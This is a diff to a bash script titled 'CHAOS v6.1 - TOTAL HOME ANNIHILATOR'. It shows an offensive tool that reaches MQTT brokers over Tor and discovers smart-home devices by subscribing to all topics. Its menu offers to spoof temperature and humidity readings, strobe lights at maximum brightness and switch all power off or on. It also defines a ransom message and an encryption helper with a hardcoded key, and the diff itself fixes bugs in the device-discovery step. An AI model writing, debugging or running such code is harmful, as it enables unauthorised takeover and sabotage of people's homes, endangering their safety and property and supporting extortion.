@@ -1,5 +1,5 @@
 #!/bin/bash
-# CHAOS v6.1 - TOTAL HOME ANNIHILATOR (TEMP/HUMIDITY/ALL) - FIXED
+# CHAOS v6.1 - TOTAL HOME ANNIHILATOR - FIXED BINARY GREP ERROR
 set -euo pipefail
 
 # TARGET SYSTEM
@@ -11,7 +11,7 @@ MAX_TEMP="50"
 MAX_HUMID="99"
 MAX_BRIGHT="255"
 CHAOS_STATUS="-TOTAL-ANNIHILATION"
-RANSOM_MSG=" -TRUSTEDF57 TOTAL HOME TAKEOVER "
+RANSOM_MSG="TRUSTEDF57- TOTAL HOME TAKEOVER "
 
 ENCRYPT_PAYLOAD() {
     echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-I-FUCK-MARTHA-ROOT" 2>/dev/null | sed 's/=//g'
@@ -28,19 +28,20 @@ TOR_PUB() {
 discover_all() {
     echo "[🔍] FULL DISCOVERY ${HOST}:${PORT} (45s)..."
     
-    # Silent discovery - background + timeout fix
-    timeout 45 ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" -v | \
-    grep -E "(Tasmota|wled|zigbee2mqtt|temp|humid|Garage|Garden|Shed|Pool|Fridge)" | \
+    # FIXED: Safe text filtering + binary safe
+    timeout 45 ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" 2>/dev/null | \
+    strings | \
+    grep -aiE "(Tasmota|wled|zigbee2mqtt|temp|humid|Garage|Garden|Shed|Pool|Fridge)" 2>/dev/null | \
     sed 's|.*/||;s|/.*||' | \
     grep -v '^$' | \
     sort -u > "chaos_all.txt"
     
-    if [[ -f "chaos_all.txt" ]]; then
+    if [[ -f "chaos_all.txt" && -s "chaos_all.txt" ]]; then
         COUNT=$(wc -l < "chaos_all.txt")
         echo "📋 TOTAL DEVICES: ${COUNT}"
     else
         echo "📋 TOTAL DEVICES: 0"
-        touch "chaos_all.txt"
+        : > "chaos_all.txt"  # Create empty file
     fi
 }
 
@@ -62,7 +63,7 @@ show_menu() {
     cat << EOF
 ┌─ TRUSTEDF57 - ${HOST}:${PORT} (${COUNT} TOTAL DEVICES) ─┐
 │ 1)  FULL SYSTEM DISCOVERY (45s)                     │
-│ 2)   TEMP 50°C +  HUMIDITY 99% (ALL SENSORS)      │
+│ 2)   TEMP 50°C + 💧 HUMIDITY 99% (ALL SENSORS)      │
 │ 3)  STROBE LIGHTS + MAX BRIGHT (Tasmota/WLED)       │
 │ 4)  ALL POWER OFF                                   │
 │ 5)  ALL POWER ON + MAX 255                          │
